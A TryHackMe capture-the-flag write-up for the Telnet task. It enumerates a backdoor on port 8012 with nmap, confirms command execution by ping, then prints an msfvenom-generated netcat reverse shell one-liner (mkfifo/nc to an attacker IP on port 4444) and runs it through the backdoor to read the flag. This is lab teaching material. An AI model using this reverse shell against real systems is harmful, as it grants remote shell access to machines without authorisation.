---
Author: Michael Baumberger
title: Network Services Telnet
parent: Network Services
ancestor: Try Hack Me Writeups
---

# Network Services Telnet

## Task 6 | Enumerating Telnet

Nmap scan the machine:

    nmap -sV -p- -A 10.10.122.25
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 21:35 CET
    Nmap scan report for 10.10.122.25
    Host is up (0.043s latency).
    Not shown: 65534 closed tcp ports (reset)
    PORT     STATE SERVICE VERSION
    8012/tcp open  unknown
    | fingerprint-strings:
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
    |_    SKIDY'S BACKDOOR. Type .HELP to view commands
    1 service unrecognized despite returning data. 
    No exact OS matches for host
    
    OS and Service detection performed.
    Nmap done: 1 IP address (1 host up) scanned in 662.36 seconds

In the scan you can se the **open tcp port 8012** with the title 'SKIDY'S BACKDOOR' so maybe it is **a backdoor** from the **user skidy**.

## Task 7 | Exploiting Telnet

With telnet we can connect to the server:

    telnet 10.10.122.25 8012
    Trying 10.10.122.25...
    Connected to 10.10.122.25.
    Escape character is '^]'.
    SKIDY'S BACKDOOR. Type .HELP to view commands

Here we can see again **'SKIDY'S BACKDOOR.'**

We can try to execute a command but get **no result**:

    SKIDY'S BACKDOOR. Type .HELP to view commands
    .HELP
    .HELP: View commands
    .RUN <command>: Execute commands
    .EXIT: Exit
    .RUN ls

Now start a tcpdump listener:

    tcpdump ip proto \\icmp -i eth0
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes

Now execute in telnet the command *'.RUN ping 10.9.0.0 -c 1'* with your ip and you should see a echo request and reply in your tcpdump listener.
This means **there is code execution**.

now we can create a reverse shell command like:

    msfvenom -p cmd/unix/reverse_netcat lhost=10.9.0.0 lport=4444 R
    [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
    [-] No arch selected, selecting arch: cmd from the payload
    No encoder specified, outputting raw payload
    Payload size: 90 bytes
    mkfifo /tmp/guzg; nc 10.9.0.0 4444 0</tmp/guzg | /bin/sh >/tmp/guzg 2>&1; rm /tmp/guzg

Wo now can listen to the lport from above via:

    nc -lvp 4444
    listening on [any] 4444 ...

Now run the mkfifo command to create the reverse shell:

    .RUN mkfifo /tmp/guzg; nc 10.9.205.135 4444 0</tmp/guzg | /bin/sh >/tmp/guzg 2>&1; rm /tmp/guzg

In your netcat listener you should see something like this but my setup is buggy because of wsl2.

    nc -lvp 4444
    listening on [any] 4444 ...
    DNS fwd/rev mismatch: PC != PC.localdomain
    connect to [172.26.102.250] from PC-Main [172.26.96.1] 58297

Now you can execute commands in this reverse shell and get the flag:

    nc -lvp 4444
    listening on [any] 4444 ...
    DNS fwd/rev mismatch: PC-Main != PC-Main.localdomain
    connect to [172.26.102.250] from PC-Main [172.26.96.1] 58297
    ls
    flag.txt
    cat flag.txt
    THM{xxxxxxxxxxxxxxxxxxxxxxx}
